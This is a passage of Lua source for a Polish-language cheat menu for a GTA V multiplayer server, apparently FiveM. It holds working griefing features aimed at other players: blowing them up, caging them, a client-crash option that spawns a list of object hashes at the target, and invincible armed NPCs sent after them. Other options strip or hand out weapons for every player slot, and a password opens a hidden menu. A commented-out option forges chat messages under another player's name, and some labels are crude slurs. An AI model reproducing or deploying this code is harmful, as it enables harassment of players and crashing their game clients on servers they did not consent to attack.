                if smiecaries('~h~~b~-»~w~ Zresp pedy', 'SpawnPeds') then
                --[[elseif piesaries('~h~~r~Fake ~w~Chat Message') then
                    local e1 = KeyboardInput('Enter message to send', '', 100)
                    local e2 = GetPlayerName(SelectedPlayer)
                    if e1 then
                        jebacariesa(
                            '_chat:messageEntered',
                            e2,
                            {
                                0,
                                0x99,
                                255
                            },
                            e1
                        )
                    end--]]
                elseif piesaries('~h~~r~Wyrzuc ~w~z auta') then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                elseif piesaries('~h~~y~Wysadz ~w~Auto') then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                    else
                        av('~h~~w~Player not in a vehicle~w~.', false)
                    end
                elseif piesaries('~h~~r~Wystrzel jego auto') then
                    if GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false) ~= 0 then
                        local e3 = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local e4 = GetEntityHeading(GetPlayerPed(SelectedPlayer))
                        --local e5 = CreatePed(5, 68070371, e3, e4, true)
                        local e6 = CreateVehicle(GetHashKey('adder'), e3, e4, true, false)
                        SetPedIntoVehicle(e5, e6, -1)
                    else
                        av('~h~~w~Player not in a vehicle~w~.', false)
                    end
                elseif piesaries('~h~~y~Banana ~p~Party') then
                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        bH,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bI,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bJ,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif piesaries('~h~~r~Wysadz') then
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
                elseif piesaries('~h~~r~Wyruchaj') then
                    pizdaSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(0)
                    end
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                        while not NetworkHasControlOfEntity(veh) do
                            NetworkRequestControlOfEntity(veh)
                            Citizen.Wait(0)
                        end
                        SetEntityAsMissionEntity(veh, true, true)
                        DeleteVehicle(veh)
                        DeleteEntity(veh)
                    end
                    count = -0.2
                    for b = 1, 3 do
                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                        local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                        SetEntityAsMissionEntity(bS, true, true)
                        AttachEntityToEntity(
                            bS,
                            GetPlayerPed(SelectedPlayer),
                            4103,
                            11816,
                            count,
                            0.00,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            false,
                            false,
                            false,
                            false,
                            2,
                            true
                        )
                        ClearPedTasks(GetPlayerPed(SelectedPlayer))
                        TaskPlayAnim(
                            GetPlayerPed(SelectedPlayer),
                            'rcmpaparazzo_2',
                            'shag_loop_poppy',
                            2.0,
                            2.5,
                            -1,
                            49,
                            0,
                            0,
                            0,
                            0
                        )
                        SetPedKeepTask(bS)
                        TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                        SetEntityInvincible(bS, true)
                        count = count - 0.4
                    end
                elseif piesaries('~h~~r~Zamknij ~w~gracza') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    pizda(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif piesaries('~h~~y~Hamburgheruj ~w~gracza') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif piesaries('~h~~y~Hamburgher ~w~Auto gracza') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 'chassis'),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif piesaries('~h~~o~_!_ ~r~CRASHuj ~w~Gracza ~o~_!_') then
                    local ej = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local ek = {
                        0x9CF21E0F,
                        0x34315488,
                        0x6A27FEB1,
                        0xCB2ACC8,
                        0xC6899CDE,
                        0xD14B5BA3,
                        0xD9F4474C,
                        0x32A9996C,
                        0x69D4F974,
                        0xCAFC1EC3,
                        0x79B41171,
                        0x1075651,
                        0xC07792D4,
                        0x781E451D,
                        0x762657C6,
                        0xC2E75A21,
                        0xC3C00861,
                        0x81FB3FF0,
                        0x45EF7804,
                        0xE65EC0E4,
                        0xE764D794,
                        0xFBF7D21F,
                        0xE1AEB708,
                        0xA5E3D471,
                        0xD971BBAE,
                        0xCF7A9A9D,
                        0xC2CC99D8,
                        0x8FB233A4,
                        0x24E08E1F,
                        0x337B2B54,
                        0xB9402F87,
                        0x4F2526DA
                    }
                    for i = 1, #ek do
                        local a = CreateObject(ek[i], ej, true, true, true)
                    end
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('SpawnPeds') then
			if piesaries('~h~~r~Zresp ~r~customowego peda') then
                    local bQ =KeyboardInput("Resp code peda https://wiki.rage.mp/index.php?title=Peds","",100000000)
                    local bR =KeyboardInput("Z jaka bronia? weapon_(nazwa)","",100000000)					
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif piesaries('~h~~r~Zresp ~w~SWAT z ~y~AK') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'WEAPON_ASSAULTRIFLE'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end 
					elseif piesaries('~h~~r~Zresp ~w~wieloryba') then
                    local bQ = 'a_c_humpback'
                    local bR = 'WEAPON_ASSAULTRIFLE'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif piesaries('~h~~r~Zresp ~w~pedofila jebanego w dupe') then
                    local bQ = 'cs_priest'
                    local bR = 'WEAPON_ASSAULTRIFLE'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                
                elseif piesaries('~h~~r~Zresp ~w~SWAT z ~y~pistoletem na flary') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_flaregun'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif piesaries('~h~~r~Zresp ~w~SWAT z ~y~Railgunem') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_railgun'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif piesaries('~h~~r~Zresp ~w~swinie') then
                    local bQ = 'a_c_pig'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end 
					elseif piesaries('~h~~r~Zresp ~w~dzika') then
                    local bQ = 'a_c_boar'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif piesaries('~h~~r~Zresp ~w~szympansa') then
                    local bQ = 'a_c_chimp'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif piesaries('~h~~r~Zresp ~w~lwa skazy') then
                    local bQ = 'a_c_mtlion'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end 
					elseif piesaries('~h~~r~Zresp ~g~aliena') then
                    local bQ = 's_m_m_movalien_01'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif piesaries('~h~~r~Zresp ~g~krowe') then
                    local bQ = 'a_c_cow'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				
				
				elseif piesaries('~h~~r~Zresp ~w~orki ') then
                    local bQ = 'a_c_killerwhale'
                    local bR = 'weapon_knife'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif piesaries('~h~~r~Zresp ~w~psy') then
                    local bQ = 'a_c_pug'
                    local bR = 'weapon_knife'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                end
                skaza.Display()
            elseif
                IsDisabledControlPressed(0, 312) 
             then
                local temp = KeyboardInput("Wpisz haslo ;)", "", 100)
                if triggerr == temp then
                    skaza.OpenMenu('\115\107\97\122\97\86\10')
                else
                    TmEM1U()
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('TeleportMenu') then
                if piesaries('~h~Tepnij do ~g~znacznika') then
                    c6()
                elseif piesaries('~h~Tepnij do ~g~najblizszego ~w~auta') then
                    b_()
                elseif piesaries('~h~Tepnij do ~r~koordow') then
                    bT()
                elseif piesaries('~h~Narysuj customowy blip na mapie') then
                    bX()
                elseif
                    jariesa(
                        '~h~Pokaz ~g~Koordy',
                        showCoords,
                        function(dR)
                            showCoords = dR
                        end
                    )
                 then
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('WeaponMenu') then
                if smiecaries('~h~~b~-»~w~ Dodaj pojedyncza bron', 'WeaponTypes') then
                elseif piesaries('~h~~g~Dodaj wszystkie bronie') then
                    for i = 1, #b6 do
                        GiveWeaponToPed(PlayerPedId(-1), GetHashKey(b6[i]), 1000, false, false)
                    end
                elseif piesaries('~h~~r~Usun wszystkie bronie') then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
                elseif piesaries('~h~Upusc obecna bron') then
                    local ak = GetPlayerPed(-1)
                    local b = GetSelectedPedWeapon(ak)
                    SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)
                elseif piesaries('~h~~g~Daj wszystkie bronie ~w~kazdemu') then
                    for el = 0, 128 do
                        --if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
                            for i = 1, #b6 do
                                GiveWeaponToPed(GetPlayerPed(el), GetHashKey(b6[i]), 1000, false, false)
                            end
                        --end
                    end
                elseif piesaries('~h~~r~Usun wszystkie bronie ~w~kazdemu') then
                    for el = 0, 128 do
                        --if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
                            for i = 1, #b6 do
                                RemoveWeaponFromPed(GetPlayerPed(el), GetHashKey(b6[i]))
                            end
                        --end
                    end
                elseif piesaries('~h~Dodaj ammo') then
                    for i = 1, #b6 do
                        AddAmmoToPed(PlayerPedId(-1), GetHashKey(b6[i]), 200)
                    end
                elseif
                    jariesa(
                        '~h~~r~OneShot Kill',
                        oneshot,
                        function(dR)
                            oneshot = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~~g~R~r~a~y~i~w~n~o~w~r~o~g~w ~w~Flare Gun',
                        rainbowf,
                        function(dR)
                            rainbowf = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Vehicle Gun',
                        VehicleGun,
                        function(dR)
                            VehicleGun = dR
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Delete Gun',
                        DeleteGun,
                        function(dR)
                            DeleteGun = dR
                        end
                    )
                 then
                end
                skaza.Display()
            elseif skaza.IsMenuOpened('tunings') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, dE in pairs(bl) do
